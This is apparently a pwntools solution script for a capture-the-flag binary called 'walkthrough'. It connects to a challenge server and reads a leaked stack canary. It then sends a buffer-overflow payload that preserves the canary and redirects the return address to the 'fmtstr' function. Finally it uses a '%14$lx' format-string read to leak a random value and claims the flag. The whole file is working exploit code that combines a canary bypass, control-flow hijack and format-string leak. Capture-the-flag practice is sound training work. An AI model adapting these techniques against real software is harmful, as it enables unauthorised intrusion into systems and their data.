from pwn import *
import sys

elf = ELF('walkthrough')
context.update(os='linux', arch='amd64', binary=elf)

host = '147.182.172.217'
port = 42001

if args.LOCAL:
	p = elf.process()
else:
	p = remote(host, port)

p.recvuntil(b'later): ')
canary = int(p.recvline()[2:-1], 16)
log.info(f'Canary: {hex(canary)}')

p.recvuntil(b'looks like on the stack.\n')
offset = 72

payload = b'A' * offset
payload += p64(canary)
payload += b'A' * 8
payload += p64(elf.symbols['fmtstr'] + 1)
p.sendline(payload)


p.recvuntil(b'passed into printf.\n')
p.sendline(b'%14$lx')
p.recvuntil(b'result is:\n')
val = int(p.recvline().strip(), 16)
log.info(f'Random value: {val}')

p.recvuntil(b'guessing.\n')
p.sendline(str(val).encode())
p.recvuntil(b'flag:\n')

log.success(f'Flag: {p.recvline().decode().strip()}')

p.close()
